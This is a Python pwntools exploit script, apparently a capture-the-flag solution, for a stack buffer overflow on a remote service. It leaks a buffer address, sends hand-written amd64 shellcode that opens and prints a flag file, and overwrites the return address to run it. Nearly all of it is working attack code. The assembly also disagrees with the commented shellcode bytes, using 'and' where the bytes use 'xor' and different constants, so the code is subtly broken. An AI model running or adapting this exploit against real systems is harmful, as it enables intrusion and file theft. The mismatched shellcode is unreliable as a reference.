from pwn import *
import struct


def interact_with_process(binary_path, host=None, port=None):
    # Start the process
    if host and port:
        p = remote(host, port)
    else:
        p = process(binary_path)

    context.arch = 'amd64'

    shellcode = asm('''
        xor rax, rax
        push rax
        mov rbx, 0x474141462f
        push rbx
        mov byte [rsp + 1], 'F'
        and byte [rsp + 1], 0x20
        mov byte [rsp + 2], 'L'
        and byte [rsp + 2], 0x20
        mov byte [rsp + 3], 'A'
        and byte [rsp + 3], 0x20
        mov byte [rsp + 4], 'G'
        and byte [rsp + 4], 0x20
        
        mov rdi, rsp
        xor rsi, rsi
        xor rdx, rdx
        mov rax, 2
        syscall
        
        mov rdi, rax
        mov rsi, rsp
        mov rdx, 0xc8
        xor rax, rax
        syscall
        
        mov rdi, 1
        mov rsi, rsp
        mov rdx, 0xc8
        mov rax, 1
        syscall
        
        xor rdi, rdi
        mov rax, 60
        syscall

    ''')
    # shellcode = b"\x48\x31\xc0\x50\x48\xbb\x2f\x46\x4c\x41\x47\x00\x00\x00\x53\xc6\x44\x24\x01\x46\x80\x74\x24\x01\x20\xc6\x44\x24\x02\x4c\x80\x74\x24\x02\x20\xc6\x44\x24\x03\x41\x80\x74\x24\x03\x20\xc6\x44\x24\x04\x47\x80\x74\x24\x04\x20\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\x48\xc7\xc0\x02\x00\x00\x00\x0f\x05\x48\x89\xc7\x48\x89\xe6\x48\xc7\xc2\xc8\x00\x00\x00\x48\x31\xc0\x0f\x05\x48\xc7\xc7\x01\x00\x00\x00\x48\x89\xe6\x48\xc7\xc2\xc8\x00\x00\x00\x48\xc7\xc0\x01\x00\x00\x00\x0f\x05\x48\x31\xff\x48\xc7\xc0\x3c\x00\x00\x00\x0f\x05"

    padding_size = (0x110 - len(shellcode))

    padding = b"A" * padding_size

    padding_rbp = b"A" * 8

    p.recvuntil(b'The address of your buffer/shellcode is: ')
    rdn_addr_str = p.recvline().strip(b'\n')
    print('rdn_addr_str', rdn_addr_str)
    rdn_addr = int(rdn_addr_str, 16)
    ret_address = p64(rdn_addr)
    print(f"Random stack address: {ret_address}")

    payload = shellcode + padding + padding_rbp + ret_address

    print(payload.hex())

    # Send the payload
    p.sendline(payload)
    p.interactive()


# Example usage
interact_with_process('', 'lmao.lol', 6192)
